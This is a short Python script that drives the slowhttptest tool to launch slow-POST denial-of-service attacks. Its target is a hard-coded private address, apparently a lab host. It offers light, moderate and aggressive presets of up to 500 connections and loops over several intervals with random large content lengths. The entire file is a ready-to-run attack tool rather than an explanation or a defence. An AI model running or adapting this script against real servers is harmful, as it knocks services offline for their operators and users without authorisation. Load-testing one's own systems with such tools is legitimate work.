
import sys
import subprocess
import random

TARGET_URL = "http://192.168.100.122/"

def main():
	if len(sys.argv) != 2:
		print("Usage: python3 slowpostattacknew2.py <category>")
		print("category: light | moderate | aggresive")
		sys.exit(1)
	category = sys.argv[1].lower()
	configs = {
		"light":    {"connection": 100, "rate": 10},
		"moderate": {"connection": 300, "rate": 30},
		"aggresive": {"connection": 500, "rate": 50},
	}
	intervals = [5, 10, 15]
	runtime = 60
	if category not in configs:
		print("Invalid category. Use: light | moderate | aggresive")
		sys.exit(1)
	connection = configs[category]["connection"]
	rate = configs[category]["rate"]
	for interval in intervals:
		# Random content-length between 1MB and 5MB (in bytes)
		content_length = random.randint(1_000_000, 5_000_000)
		cmd = [
			"slowhttptest",
			"-c", str(connection),
			"-B",
			"-r", str(rate),
			"-u", TARGET_URL,
			"-s", str(content_length),
			"-i", str(interval),
			"-l", str(runtime)
		]
		print(f"[INFO] Running: {' '.join(cmd)}")
		subprocess.run(cmd)

if __name__ == "__main__":
	main()